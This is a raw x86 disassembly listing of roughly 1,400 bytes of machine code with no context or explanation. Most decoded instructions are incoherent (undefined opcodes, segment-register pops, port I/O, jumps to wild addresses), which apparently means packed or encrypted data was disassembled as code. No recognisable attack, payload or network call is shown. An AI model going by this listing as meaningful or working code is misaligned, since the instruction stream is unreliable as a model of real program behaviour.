  4047ee:	92                   	xchg   %eax,%edx
  4047ef:	5f                   	pop    %edi
  4047f0:	1c b4                	sbb    $0xb4,%al
  4047f2:	17                   	pop    %ss
  4047f3:	58                   	pop    %eax
  4047f4:	4c                   	dec    %esp
  4047f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4047f6:	31 a8 f3 da 02 34    	xor    %ebp,0x3402daf3(%eax)
  4047fc:	e8 6d bf 0c d9       	call   0xd94d076e
  404801:	c0 d0 29             	rcl    $0x29,%al
  404804:	c8 4b 1e ba          	enter  $0x1e4b,$0xba
  404808:	b2 50                	mov    $0x50,%dl
  40480a:	ce                   	into
  40480b:	c2 13 31             	ret    $0x3113
  40480e:	d4 03                	aam    $0x3
  404810:	94                   	xchg   %eax,%esp
  404811:	be bf f3 36 f3       	mov    $0xf336f3bf,%esi
  404816:	7b 06                	jnp    0x40481e
  404818:	c3                   	ret
  404819:	b0 b5                	mov    $0xb5,%al
  40481b:	e6 82                	out    %al,$0x82
  40481d:	7e e4                	jle    0x404803
  40481f:	85 a2 78 3b bc ae    	test   %esp,-0x5143c488(%edx)
  404825:	7e 69                	jle    0x404890
  404827:	cd 62                	int    $0x62
  404829:	e3 3d                	jecxz  0x404868
  40482b:	7c 22                	jl     0x40484f
  40482d:	ae                   	scas   %es:(%edi),%al
  40482e:	6d                   	insl   (%dx),%es:(%edi)
  40482f:	06                   	push   %es
  404830:	05 0b dd c3 61       	add    $0x61c3dd0b,%eax
  404835:	f3 10 19             	repz adc %bl,(%ecx)
  404838:	14 81                	adc    $0x81,%al
  40483a:	e0 67                	loopne 0x4048a3
  40483c:	51                   	push   %ecx
  40483d:	6a 28                	push   $0x28
  40483f:	28 fc                	sub    %bh,%ah
  404841:	8a 6b c7             	mov    -0x39(%ebx),%ch
  404844:	8f                   	(bad)
  404845:	e5 56                	in     $0x56,%eax
  404847:	50                   	push   %eax
  404848:	6b 95 8a f7 1d d6 e6 	imul   $0xffffffe6,-0x29e20876(%ebp),%edx
  40484f:	bd eb 5d 9a 93       	mov    $0x939a5deb,%ebp
  404854:	2a d9                	sub    %cl,%bl
  404856:	b1 a7                	mov    $0xa7,%cl
  404858:	b6 f0                	mov    $0xf0,%dh
  40485a:	d5 40                	aad    $0x40
  40485c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40485d:	62 41 d0             	bound  %eax,-0x30(%ecx)
  404860:	0f 8d 10 2c b3 16    	jge    0x16f37476
  404866:	db 06                	fildl  (%esi)
  404868:	70 d0                	jo     0x40483a
  40486a:	c3                   	ret
  40486b:	8b 64 14 73          	mov    0x73(%esp,%edx,1),%esp
  40486f:	69 0a 82 35 60 bf    	imul   $0xbf603582,(%edx),%ecx
  404875:	32 39                	xor    (%ecx),%bh
  404877:	77 67                	ja     0x4048e0
  404879:	62 7e 38             	bound  %edi,0x38(%esi)
  40487c:	70 27                	jo     0x4048a5
  40487e:	d2 c9                	ror    %cl,%cl
  404880:	a1 1e 68 29 cd       	mov    0xcd29681e,%eax
  404885:	b0 a4                	mov    $0xa4,%al
  404887:	90                   	nop
  404888:	81 01 76 f5 96 b5    	addl   $0xb596f576,(%ecx)
  40488e:	d9 4f 3f             	(bad) 0x3f(%edi)
  404891:	0e                   	push   %cs
  404892:	04 a7                	add    $0xa7,%al
  404894:	fd                   	std
  404895:	2b 44 46 7f          	sub    0x7f(%esi,%eax,2),%eax
  404899:	27                   	daa
  40489a:	d6                   	salc
  40489b:	32 13                	xor    (%ebx),%dl
  40489d:	87 e4                	xchg   %esp,%esp
  40489f:	7b 8f                	jnp    0x404830
  4048a1:	e9 94 70 01 8f       	jmp    0x8f41b93a
  4048a6:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4048a7:	30 62 ca             	xor    %ah,-0x36(%edx)
  4048aa:	37                   	aaa
  4048ab:	67 8c 34             	mov    %?,(%si)
  4048ae:	1f                   	pop    %ds
  4048af:	26 de e7             	es fsubp %st,%st(7)
  4048b2:	dc 73 24             	fdivl  0x24(%ebx)
  4048b5:	7f 0d                	jg     0x4048c4
  4048b7:	d3 32                	shll   %cl,(%edx)
  4048b9:	e3 3f                	jecxz  0x4048fa
  4048bb:	bf df f9 fd 38       	mov    $0x38fdf9df,%edi
  4048c0:	e4 b7                	in     $0xb7,%al
  4048c2:	7a 4a                	jp     0x40490e
  4048c4:	53                   	push   %ebx
  4048c5:	98                   	cwtl
  4048c6:	b4 5f                	mov    $0x5f,%ah
  4048c8:	9f                   	lahf
  4048c9:	05 18 2b 2b fd       	add    $0xfd2b2b18,%eax
  4048ce:	01 3b                	add    %edi,(%ebx)
  4048d0:	5e                   	pop    %esi
  4048d1:	5d                   	pop    %ebp
  4048d2:	f5                   	cmc
  4048d3:	1c a0                	sbb    $0xa0,%al
  4048d5:	7f 94                	jg     0x40486b
  4048d7:	a3 74 a8 35 bb       	mov    %eax,0xbb35a874
  4048dc:	a3 77 8e 64 22       	mov    %eax,0x22648e77
  4048e1:	8b 03                	mov    (%ebx),%eax
  4048e3:	b5 89                	mov    $0x89,%ch
  4048e5:	94                   	xchg   %eax,%esp
  4048e6:	d9 26                	fldenv (%esi)
  4048e8:	cf                   	iret
  4048e9:	08 d5                	or     %dl,%ch
  4048eb:	c6                   	(bad)
  4048ec:	52                   	push   %edx
  4048ed:	59                   	pop    %ecx
  4048ee:	fd                   	std
  4048ef:	22 2d 5d 11 42 b1    	and    0xb142115d,%ch
  4048f5:	be ee bf cb 53       	mov    $0x53cbbfee,%esi
  4048fa:	6b 00 35             	imul   $0x35,(%eax),%eax
  4048fd:	d9 f9                	fyl2xp1
  4048ff:	76 65                	jbe    0x404966
  404901:	aa                   	stos   %al,%es:(%edi)
  404902:	f2 ac                	repnz lods %ds:(%esi),%al
  404904:	1e                   	push   %ds
  404905:	14 35                	adc    $0x35,%al
  404907:	b1 22                	mov    $0x22,%cl
  404909:	9a 3b 4c bf f0 80 5b 	lcall  $0x5b80,$0xf0bf4c3b
  404910:	d2 8c cc 37 3d f7 2e 	rorb   %cl,0x2ef73d37(%esp,%ecx,8)
  404917:	eb f3                	jmp    0x40490c
  404919:	13 70 75             	adc    0x75(%eax),%esi
  40491c:	63 84 91 29 27 b3 7b 	arpl   %eax,0x7bb32729(%ecx,%edx,4)
  404923:	28 a8 36 97 d4 c9    	sub    %ch,-0x362b68ca(%eax)
  404929:	da 1d 9a 77 37 1d    	ficompl 0x1d37779a
  40492f:	a2 a1 57 30 8e       	mov    %al,0x8e3057a1
  404934:	06                   	push   %es
  404935:	d5 ee                	aad    $0xee
  404937:	d1 c2                	rol    $1,%edx
  404939:	b2 bf                	mov    $0xbf,%dl
  40493b:	b3 86                	mov    $0x86,%bl
  40493d:	27                   	daa
  40493e:	14 11                	adc    $0x11,%al
  404940:	4e                   	dec    %esi
  404941:	27                   	daa
  404942:	ff 2a                	ljmp   *(%edx)
  404944:	0c 28                	or     $0x28,%al
  404946:	80 39 36             	cmpb   $0x36,(%ecx)
  404949:	e7 7d                	out    %eax,$0x7d
  40494b:	13 f1                	adc    %ecx,%esi
  40494d:	2e 9e                	cs sahf
  40494f:	4a                   	dec    %edx
  404950:	57                   	push   %edi
  404951:	0c 4e                	or     $0x4e,%al
  404953:	65 78 d1             	gs js  0x404927
  404956:	57                   	push   %edi
  404957:	7d 3e                	jge    0x404997
  404959:	d7                   	xlat   %ds:(%ebx)
  40495a:	6e                   	outsb  %ds:(%esi),(%dx)
  40495b:	a2 69 41 b9 6e       	mov    %al,0x6eb94169
  404960:	f1                   	int1
  404961:	4f                   	dec    %edi
  404962:	bd be c0 cd d0       	mov    $0xd0cdc0be,%ebp
  404967:	68 21 29 99 4e       	push   $0x4e992921
  40496c:	e3 c3                	jecxz  0x404931
  40496e:	d1 af 1f 84 4f 9d    	shrl   $1,-0x62b07be1(%edi)
  404974:	72 8e                	jb     0x404904
  404976:	84 fe                	test   %bh,%dh
  404978:	25 51 1f 10 4c       	and    $0x4c101f51,%eax
  40497d:	fe                   	(bad)
  40497e:	6f                   	outsl  %ds:(%esi),(%dx)
  40497f:	65 9d                	gs popf
  404981:	d8 36                	fdivs  (%esi)
  404983:	d2 db                	rcr    %cl,%bl
  404985:	bc 92 e6 9a 96       	mov    $0x969ae692,%esp
  40498a:	12 4a 80             	adc    -0x80(%edx),%cl
  40498d:	4a                   	dec    %edx
  40498e:	b0 79                	mov    $0x79,%al
  404990:	c8 7d 70 d2          	enter  $0x707d,$0xd2
  404994:	c6                   	(bad)
  404995:	c8 7d 97 a7          	enter  $0x977d,$0xa7
  404999:	8a 22                	mov    (%edx),%ah
  40499b:	db b8 86 ef 8a 6a    	fstpt  0x6a8aef86(%eax)
  4049a1:	53                   	push   %ebx
  4049a2:	7a ff                	jp     0x4049a3
  4049a4:	5d                   	pop    %ebp
  4049a5:	b8 38 84 38 e9       	mov    $0xe9388438,%eax
  4049aa:	06                   	push   %es
  4049ab:	5b                   	pop    %ebx
  4049ac:	cc                   	int3
  4049ad:	39 82 10 fc 46 13    	cmp    %eax,0x1346fc10(%edx)
  4049b3:	95                   	xchg   %eax,%ebp
  4049b4:	54                   	push   %esp
  4049b5:	ef                   	out    %eax,(%dx)
  4049b6:	56                   	push   %esi
  4049b7:	d4 e9                	aam    $0xe9
  4049b9:	f6 d2                	not    %dl
  4049bb:	36 57                	ss push %edi
  4049bd:	02 47 12             	add    0x12(%edi),%al
  4049c0:	02 55 3c             	add    0x3c(%ebp),%dl
  4049c3:	a2 d2 77 69 f3       	mov    %al,0xf36977d2
  4049c8:	a2 95 1b 81 b5       	mov    %al,0xb5811b95
  4049cd:	10 6a 23             	adc    %ch,0x23(%edx)
  4049d0:	1e                   	push   %ds
  4049d1:	0f 5f 03             	maxps  (%ebx),%xmm0
  4049d4:	c3                   	ret
  4049d5:	f3 98                	repz cwtl
  4049d7:	1d f4 c5 ca 6c       	sbb    $0x6ccac5f4,%eax
  4049dc:	73 78                	jae    0x404a56
  4049de:	d2 52 ca             	rclb   %cl,-0x36(%edx)
  4049e1:	67 77 dd             	addr16 ja 0x4049c1
  4049e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4049e5:	00 80 8a 66 18 8a    	add    %al,-0x75e79976(%eax)
  4049eb:	8b a3 06 0c 97 33    	mov    0x33970c06(%ebx),%esp
  4049f1:	c7                   	(bad)
  4049f2:	e1 02                	loope  0x4049f6
  4049f4:	63 86 e5 4e 0a 41    	arpl   %eax,0x410a4ee5(%esi)
  4049fa:	88 1c 52             	mov    %bl,(%edx,%edx,2)
  4049fd:	50                   	push   %eax
  4049fe:	19 e0                	sbb    %esp,%eax
  404a00:	cb                   	lret
  404a01:	ff f1                	push   %ecx
  404a03:	d0 43 3a             	rolb   $1,0x3a(%ebx)
  404a06:	90                   	nop
  404a07:	8a d1                	mov    %cl,%dl
  404a09:	88 12                	mov    %dl,(%edx)
  404a0b:	90                   	nop
  404a0c:	51                   	push   %ecx
  404a0d:	76 0a                	jbe    0x404a19
  404a0f:	7a 7b                	jp     0x404a8c
  404a11:	5c                   	pop    %esp
  404a12:	9c                   	pushf
  404a13:	50                   	push   %eax
  404a14:	51                   	push   %ecx
  404a15:	e8 99 d3 3d 12       	call   0x127e1db3
  404a1a:	d5 6c                	aad    $0x6c
  404a1c:	ff 4e e4             	decl   -0x1c(%esi)
  404a1f:	0a 36                	or     (%esi),%dh
  404a21:	f3 65 8f             	repz gs (bad)
  404a24:	f9                   	stc
  404a25:	5c                   	pop    %esp
  404a26:	c6                   	(bad)
  404a27:	14 89                	adc    $0x89,%al
  404a29:	13 78 a1             	adc    -0x5f(%eax),%edi
  404a2c:	b2 ec                	mov    $0xec,%dl
  404a2e:	4d                   	dec    %ebp
  404a2f:	49                   	dec    %ecx
  404a30:	52                   	push   %edx
  404a31:	38 25 2b 1a 2d 9f    	cmp    %ah,0x9f2d1a2b
  404a37:	d3 41 ae             	roll   %cl,-0x52(%ecx)
  404a3a:	97                   	xchg   %eax,%edi
  404a3b:	09 e3                	or     %esp,%ebx
  404a3d:	5a                   	pop    %edx
  404a3e:	16                   	push   %ss
  404a3f:	44                   	inc    %esp
  404a40:	e4 a7                	in     $0xa7,%al
  404a42:	f3 53                	repz push %ebx
  404a44:	b4 78                	mov    $0x78,%ah
  404a46:	ab                   	stos   %eax,%es:(%edi)
  404a47:	a8 64                	test   $0x64,%al
  404a49:	dc 41 8e             	faddl  -0x72(%ecx)
  404a4c:	54                   	push   %esp
  404a4d:	9b                   	fwait
  404a4e:	21 82 6c d5 49 b0    	and    %eax,-0x4fb62a94(%edx)
  404a54:	b0 b4                	mov    $0xb4,%al
  404a56:	ae                   	scas   %es:(%edi),%al
  404a57:	f1                   	int1
  404a58:	c5 98 73 87 f5 87    	lds    -0x780a788d(%eax),%ebx
  404a5e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404a5f:	c5 24 1c             	lds    (%esp,%ebx,1),%esp
  404a62:	21 9b cf 92 a2 86    	and    %ebx,-0x795d6d31(%ebx)
  404a68:	e2 26                	loop   0x404a90
  404a6a:	6b f0 79             	imul   $0x79,%eax,%esi
  404a6d:	d8 6d 98             	fsubrs -0x68(%ebp)
  404a70:	f2 bc 13 96 0c b6    	repnz mov $0xb60c9613,%esp
  404a76:	9b                   	fwait
  404a77:	89 86 15 a8 42 a2    	mov    %eax,-0x5dbd57eb(%esi)
  404a7d:	55                   	push   %ebp
  404a7e:	a9 af be 34 3c       	test   $0x3c34beaf,%eax
  404a83:	32 e0                	xor    %al,%ah
  404a85:	9d                   	popf
  404a86:	c7                   	(bad)
  404a87:	5c                   	pop    %esp
  404a88:	7f 36                	jg     0x404ac0
  404a8a:	52                   	push   %edx
  404a8b:	15 f0 db b1 ac       	adc    $0xacb1dbf0,%eax
  404a90:	3d 81 7e b2 b7       	cmp    $0xb7b27e81,%eax
  404a95:	e7 57                	out    %eax,$0x57
  404a97:	f9                   	stc
  404a98:	df 84 57 37 c8 7d 05 	filds  0x57dc837(%edi,%edx,2)
  404a9f:	84 b3 a3 75 cb c8    	test   %dh,-0x37348a5d(%ebx)
  404aa5:	ca 3a 83             	lret   $0x833a
  404aa8:	0e                   	push   %cs
  404aa9:	f9                   	stc
  404aaa:	c9                   	leave
  404aab:	25 8f fb 9a cd       	and    $0xcd9afb8f,%eax
  404ab0:	1a df                	sbb    %bh,%bl
  404ab2:	28 13                	sub    %dl,(%ebx)
  404ab4:	c1 b4 f9 51 b8 90 ad 	shll   $0x2a,-0x526f47af(%ecx,%edi,8)
  404abb:	2a 
  404abc:	8e 0f                	mov    (%edi),%cs
  404abe:	fe 8b 0b 29 b6 f4    	decb   -0xb49d6f5(%ebx)
  404ac4:	81 d6 34 00 b8 14    	adc    $0x14b80034,%esi
  404aca:	e8 dd de cd 6f       	call   0x700e29ac
  404acf:	6b 7b 44 a9          	imul   $0xffffffa9,0x44(%ebx),%edi
  404ad3:	d9 0b                	(bad) (%ebx)
  404ad5:	48                   	dec    %eax
  404ad6:	f8                   	clc
  404ad7:	7a 47                	jp     0x404b20
  404ad9:	91                   	xchg   %eax,%ecx
  404ada:	55                   	push   %ebp
  404adb:	b1 a0                	mov    $0xa0,%cl
  404add:	1a 99 8e 16 32 fe    	sbb    -0x1cde972(%ecx),%bl
  404ae3:	71 a3                	jno    0x404a88
  404ae5:	4f                   	dec    %edi
  404ae6:	ba a4 f6 0e 78       	mov    $0x780ef6a4,%edx
  404aeb:	01 5f 66             	add    %ebx,0x66(%edi)
  404aee:	1e                   	push   %ds
  404aef:	6a e3                	push   $0xffffffe3
  404af1:	6e                   	outsb  %ds:(%esi),(%dx)
  404af2:	45                   	inc    %ebp
  404af3:	dc bf bb 39 84 7f    	fdivrl 0x7f8439bb(%edi)
  404af9:	56                   	push   %esi
  404afa:	e7 ec                	out    %eax,$0xec
  404afc:	07                   	pop    %es
  404afd:	b4 52                	mov    $0x52,%ah
  404aff:	ba 0f 25 86 d5       	mov    $0xd586250f,%edx
  404b04:	1b cb                	sbb    %ebx,%ecx
  404b06:	30 02                	xor    %al,(%edx)
  404b08:	ff 4a b3             	decl   -0x4d(%edx)
  404b0b:	0f d0                	(bad)
  404b0d:	ea 27 1b d8 1b 2b 5c 	ljmp   $0x5c2b,$0x1bd81b27
  404b14:	89 2a                	mov    %ebp,(%edx)
  404b16:	3a 77 1a             	cmp    0x1a(%edi),%dh
  404b19:	03 90 38 cf ad 4d    	add    0x4dadcf38(%eax),%edx
  404b1f:	d7                   	xlat   %ds:(%ebx)
  404b20:	3a 48 34             	cmp    0x34(%eax),%cl
  404b23:	87 bb 49 9c 24 c5    	xchg   %edi,-0x3adb63b7(%ebx)
  404b29:	26 49                	es dec %ecx
  404b2b:	bd b5 a4 e0 99       	mov    $0x99e0a4b5,%ebp
  404b30:	e2 41                	loop   0x404b73
  404b32:	d9 66 c8             	fldenv -0x38(%esi)
  404b35:	1f                   	pop    %ds
  404b36:	1a 2d 2c 20 40 71    	sbb    0x7140202c,%ch
  404b3c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404b3d:	4f                   	dec    %edi
  404b3e:	e7 a4                	out    %eax,$0xa4
  404b40:	41                   	inc    %ecx
  404b41:	38 78 6a             	cmp    %bh,0x6a(%eax)
  404b44:	94                   	xchg   %eax,%esp
  404b45:	c1 79 76 56          	sarl   $0x56,0x76(%ecx)
  404b49:	84 16                	test   %dl,(%esi)
  404b4b:	30 ce                	xor    %cl,%dh
  404b4d:	52                   	push   %edx
  404b4e:	c7                   	(bad)
  404b4f:	ac                   	lods   %ds:(%esi),%al
  404b50:	1d 09 84 f8 e5       	sbb    $0xe5f88409,%eax
  404b55:	7b 3a                	jnp    0x404b91
  404b57:	6f                   	outsl  %ds:(%esi),(%dx)
  404b58:	27                   	daa
  404b59:	46                   	inc    %esi
  404b5a:	d5 da                	aad    $0xda
  404b5c:	d4 94                	aam    $0x94
  404b5e:	96                   	xchg   %eax,%esi
  404b5f:	3a d2                	cmp    %dl,%dl
  404b61:	c3                   	ret
  404b62:	6f                   	outsl  %ds:(%esi),(%dx)
  404b63:	4b                   	dec    %ebx
  404b64:	ed                   	in     (%dx),%eax
  404b65:	ae                   	scas   %es:(%edi),%al
  404b66:	17                   	pop    %ss
  404b67:	3b 31                	cmp    (%ecx),%esi
  404b69:	bb b8 68 34 2e       	mov    $0x2e3468b8,%ebx
  404b6e:	30 9b 32 7e b4 dc    	xor    %bl,-0x234b81ce(%ebx)
  404b74:	a1 3e 0d 53 5c       	mov    0x5c530d3e,%eax
  404b79:	fe                   	(bad)
  404b7a:	1a b6 8d 2c db 36    	sbb    0x36db2c8d(%esi),%dh
  404b80:	37                   	aaa
  404b81:	4b                   	dec    %ebx
  404b82:	af                   	scas   %es:(%edi),%eax
  404b83:	d4 51                	aam    $0x51
  404b85:	07                   	pop    %es
  404b86:	9d                   	popf
  404b87:	53                   	push   %ebx
  404b88:	f3 14 0a             	repz adc $0xa,%al
  404b8b:	33 e8                	xor    %eax,%ebp
  404b8d:	6f                   	outsl  %ds:(%esi),(%dx)
  404b8e:	bd c5 2b d9 7a       	mov    $0x7ad92bc5,%ebp
  404b93:	9a b4 7d dc a3 bf d2 	lcall  $0xd2bf,$0xa3dc7db4
  404b9a:	76 7f                	jbe    0x404c1b
  404b9c:	c1 41 f3 74          	roll   $0x74,-0xd(%ecx)
  404ba0:	93                   	xchg   %eax,%ebx
  404ba1:	e0 4c                	loopne 0x404bef
  404ba3:	22 1a                	and    (%edx),%bl
  404ba5:	6a f9                	push   $0xfffffff9
  404ba7:	ec                   	in     (%dx),%al
  404ba8:	bc fb 51 5f e2       	mov    $0xe25f51fb,%esp
  404bad:	5a                   	pop    %edx
  404bae:	35 4c a3 a3 97       	xor    $0x97a3a34c,%eax
  404bb3:	46                   	inc    %esi
  404bb4:	0c 40                	or     $0x40,%al
  404bb6:	47                   	inc    %edi
  404bb7:	f4                   	hlt
  404bb8:	8c 70 aa             	mov    %?,-0x56(%eax)
  404bbb:	fd                   	std
  404bbc:	c1 f3 d5             	shl    $0xd5,%ebx
  404bbf:	8c 04 48             	mov    %es,(%eax,%ecx,2)
  404bc2:	e5 d0                	in     $0xd0,%eax
  404bc4:	65 e6 75             	gs out %al,$0x75
  404bc7:	7a 61                	jp     0x404c2a
  404bc9:	5d                   	pop    %ebp
  404bca:	d2 cf                	ror    %cl,%bh
  404bcc:	8d 93 6b 7c 3b 37    	lea    0x373b7c6b(%ebx),%edx
  404bd2:	b7 30                	mov    $0x30,%bh
  404bd4:	8f                   	(bad)
  404bd5:	d4 0f                	aam    $0xf
  404bd7:	d0 6e 27             	shrb   $1,0x27(%esi)
  404bda:	e9 1a 8e 71 87       	jmp    0x87b1d9f9
  404bdf:	93                   	xchg   %eax,%ebx
  404be0:	ea b3 20 4e ce fe b0 	ljmp   $0xb0fe,$0xce4e20b3
  404be7:	54                   	push   %esp
  404be8:	35 34 4a 4d 75       	xor    $0x754d4a34,%eax
  404bed:	ac                   	lods   %ds:(%esi),%al
  404bee:	a9 d4 60 57 35       	test   $0x355760d4,%eax
  404bf3:	b0 6e                	mov    $0x6e,%al
  404bf5:	96                   	xchg   %eax,%esi
  404bf6:	b6 ae                	mov    $0xae,%dh
  404bf8:	2e 69 6f d2 8f 24 b9 	imul   $0x64b9248f,%cs:-0x2e(%edi),%ebp
  404bff:	64 
  404c00:	71 75                	jno    0x404c77
  404c02:	f8                   	clc
  404c03:	44                   	inc    %esp
  404c04:	9c                   	pushf
  404c05:	6f                   	outsl  %ds:(%esi),(%dx)
  404c06:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404c07:	6b 59 36 85          	imul   $0xffffff85,0x36(%ecx),%ebx
  404c0b:	18 6e 45             	sbb    %ch,0x45(%esi)
  404c0e:	c2 72 52             	ret    $0x5272
  404c11:	38 69 db             	cmp    %ch,-0x25(%ecx)
  404c14:	0c a1                	or     $0xa1,%al
  404c16:	c1 02 ab             	roll   $0xab,(%edx)
  404c19:	0e                   	push   %cs
  404c1a:	63 18                	arpl   %ebx,(%eax)
  404c1c:	d6                   	salc
  404c1d:	9c                   	pushf
  404c1e:	cf                   	iret
  404c1f:	5d                   	pop    %ebp
  404c20:	5c                   	pop    %esp
  404c21:	eb 14                	jmp    0x404c37
  404c23:	4c                   	dec    %esp
  404c24:	05 d4 36 45 6d       	add    $0x6d4536d4,%eax
  404c29:	98                   	cwtl
  404c2a:	e4 39                	in     $0x39,%al
  404c2c:	2a 2c 88             	sub    (%eax,%ecx,4),%ch
  404c2f:	28 af 39 13 a7 64    	sub    %ch,0x64a71339(%edi)
  404c35:	46                   	inc    %esi
  404c36:	08 6e 22             	or     %ch,0x22(%esi)
  404c39:	4a                   	dec    %edx
  404c3a:	29 1c e4             	sub    %ebx,(%esp,%eiz,8)
  404c3d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404c3e:	f2 96                	repnz xchg %eax,%esi
  404c40:	3e 79 fa             	jns,pt 0x404c3d
  404c43:	9d                   	popf
  404c44:	28 f6                	sub    %dh,%dh
  404c46:	3c f7                	cmp    $0xf7,%al
  404c48:	ec                   	in     (%dx),%al
  404c49:	38 fa                	cmp    %bh,%dl
  404c4b:	09 9d 00 06 f3 09    	or     %ebx,0x9f30600(%ebp)
  404c51:	e8 d0 55 86 9d       	call   0x9dc6a226
  404c56:	f6 02 47             	testb  $0x47,(%edx)
  404c59:	d4 ae                	aam    $0xae
  404c5b:	73 0c                	jae    0x404c69
  404c5d:	15 3c 3c 48 0e       	adc    $0xe483c3c,%eax
  404c62:	1e                   	push   %ds
  404c63:	ab                   	stos   %eax,%es:(%edi)
  404c64:	72 b3                	jb     0x404c19
  404c66:	47                   	inc    %edi
  404c67:	68 98 c0 fd 23       	push   $0x23fdc098
  404c6c:	58                   	pop    %eax
  404c6d:	cc                   	int3
  404c6e:	90                   	nop
  404c6f:	a1 e9 d9 3d 2d       	mov    0x2d3dd9e9,%eax
  404c74:	fc                   	cld
  404c75:	74 62                	je     0x404cd9
  404c77:	49                   	dec    %ecx
  404c78:	3a db                	cmp    %bl,%bl
  404c7a:	df 67 21             	fbld   0x21(%edi)
  404c7d:	52                   	push   %edx
  404c7e:	74 a8                	je     0x404c28
  404c80:	55                   	push   %ebp
  404c81:	50                   	push   %eax
  404c82:	a1 04 0c 20 89       	mov    0x89200c04,%eax
  404c87:	57                   	push   %edi
  404c88:	a1 54 73 7f c1       	mov    0xc17f7354,%eax
  404c8d:	34 f1                	xor    $0xf1,%al
  404c8f:	16                   	push   %ss
  404c90:	e1 5a                	loope  0x404cec
  404c92:	26 7a 8d             	es jp  0x404c22
  404c95:	76 0e                	jbe    0x404ca5
  404c97:	95                   	xchg   %eax,%ebp
  404c98:	14 06                	adc    $0x6,%al
  404c9a:	4e                   	dec    %esi
  404c9b:	8b 14 8a             	mov    (%edx,%ecx,4),%edx
  404c9e:	0d 3a f3 55 92       	or     $0x9255f33a,%eax
  404ca3:	89 94 a0 2d 53 60 71 	mov    %edx,0x7160532d(%eax,%eiz,4)
  404caa:	dc 6d 39             	fsubrl 0x39(%ebp)
  404cad:	e5 65                	in     $0x65,%eax
  404caf:	2a fa                	sub    %dl,%bh
  404cb1:	94                   	xchg   %eax,%esp
  404cb2:	bc 16 52 22 7e       	mov    $0x7e225216,%esp
  404cb7:	2c b1                	sub    $0xb1,%al
  404cb9:	dc 9d a4 03 f7 2e    	fcompl 0x2ef703a4(%ebp)
  404cbf:	44                   	inc    %esp
  404cc0:	1a 37                	sbb    (%edi),%dh
  404cc2:	c7                   	(bad)
  404cc3:	de db                	(bad)
  404cc5:	ea b9 e0 50 fd 5c 77 	ljmp   $0x775c,$0xfd50e0b9
  404ccc:	b0 ac                	mov    $0xac,%al
  404cce:	88 80 8f c7 41 b4    	mov    %al,-0x4bbe3871(%eax)
  404cd4:	c6                   	(bad)
  404cd5:	7b a5                	jnp    0x404c7c
  404cd7:	33 08                	xor    (%eax),%ecx
  404cd9:	bc 11 7b b6 e7       	mov    $0xe7b67b11,%esp
  404cde:	db de                	fcmovnu %st(6),%st
  404ce0:	f6 f5                	div    %ch
  404ce2:	8d aa aa cb fe c0    	lea    -0x3f013456(%edx),%ebp
  404ce8:	b8 cb a5 04 06       	mov    $0x604a5cb,%eax
  404ced:	41                   	inc    %ecx
  404cee:	02 01                	add    (%ecx),%al
  404cf0:	47                   	inc    %edi
  404cf1:	9c                   	pushf
  404cf2:	6a 42                	push   $0x42
  404cf4:	84 6f 2e             	test   %ch,0x2e(%edi)
  404cf7:	60                   	pusha
  404cf8:	44                   	inc    %esp
  404cf9:	77 cd                	ja     0x404cc8
  404cfb:	ec                   	in     (%dx),%al
  404cfc:	bd a5 b3 e5 4b       	mov    $0x4be5b3a5,%ebp
  404d01:	b9 63 57 3c eb       	mov    $0xeb3c5763,%ecx
  404d06:	30 53 8f             	xor    %dl,-0x71(%ebx)
  404d09:	dd 63 fd             	frstor -0x3(%ebx)
  404d0c:	97                   	xchg   %eax,%edi
  404d0d:	8e 67 ca             	mov    -0x36(%edi),%fs
  404d10:	23 24 91             	and    (%ecx,%edx,4),%esp
  404d13:	08 b6 d4 9d e1 d4    	or     %dh,-0x2b1e622c(%esi)
  404d19:	4f                   	dec    %edi
  404d1a:	fb                   	sti
  404d1b:	9a 75 29 1d 48 67 6d 	lcall  $0x6d67,$0x481d2975
  404d22:	f5                   	cmc
  404d23:	a8 27                	test   $0x27,%al
  404d25:	a9 27 fe c3 ee       	test   $0xeec3fe27,%eax
  404d2a:	11 78 d3             	adc    %edi,-0x2d(%eax)
  404d2d:	c1 79 da a5          	sarl   $0xa5,-0x26(%ecx)
  404d31:	f7 28                	imull  (%eax)
  404d33:	94                   	xchg   %eax,%esp
  404d34:	6e                   	outsb  %ds:(%esi),(%dx)
  404d35:	25 5f 71 8b 9a       	and    $0x9a8b715f,%eax
  404d3a:	4f                   	dec    %edi
  404d3b:	db d3                	fcmovnbe %st(3),%st
  404d3d:	14 ad                	adc    $0xad,%al
  404d3f:	9e                   	sahf
  404d40:	b1 35                	mov    $0x35,%cl
  404d42:	58                   	pop    %eax
  404d43:	8f                   	(bad)
  404d44:	3c 38                	cmp    $0x38,%al
  404d46:	06                   	push   %es
  404d47:	e7 ba                	out    %eax,$0xba
  404d49:	ce                   	into
  404d4a:	61                   	popa
  404d4b:	18 7f 11             	sbb    %bh,0x11(%edi)
  404d4e:	55                   	push   %ebp
  404d4f:	7f cc                	jg     0x404d1d
  404d51:	af                   	scas   %es:(%edi),%eax
  404d52:	e5 d5                	in     $0xd5,%eax
  404d54:	bf ca 20 3c b2       	mov    $0xb23c20ca,%edi
  404d59:	8a 41 b8             	mov    -0x48(%ecx),%al
  404d5c:	f3 13 63 79          	repz adc 0x79(%ebx),%esp
  404d60:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  404d63:	1d 9d da 9e 84       	sbb    $0x849eda9d,%eax
  404d68:	c9                   	leave
  404d69:	fc                   	cld
  404d6a:	31 95 02 30 eb e0    	xor    %edx,-0x1f14cffe(%ebp)
  404d70:	e9 42 6e 08 ef       	jmp    0xef48bbb7
  404d75:	df 29                	fildll (%ecx)
  404d77:	f2 ae                	repnz scas %es:(%edi),%al
  404d79:	1c 37                	sbb    $0x37,%al
  404d7b:	08 25 32 90 f2 ab    	or     %ah,0xabf29032
  404d81:	2c d6                	sub    $0xd6,%al
  404d83:	5e                   	pop    %esi
  404d84:	5c                   	pop    %esp
  404d85:	b9 d1 c0 36 c3       	mov    $0xc336c0d1,%ecx
  404d8a:	6a 68                	push   $0x68
  404d8c:	a3 74 78 cc 88       	mov    %eax,0x88cc7874
  404d91:	16                   	push   %ss
  404d92:	61                   	popa
  404d93:	4f                   	dec    %edi
  404d94:	cd bf                	int    $0xbf
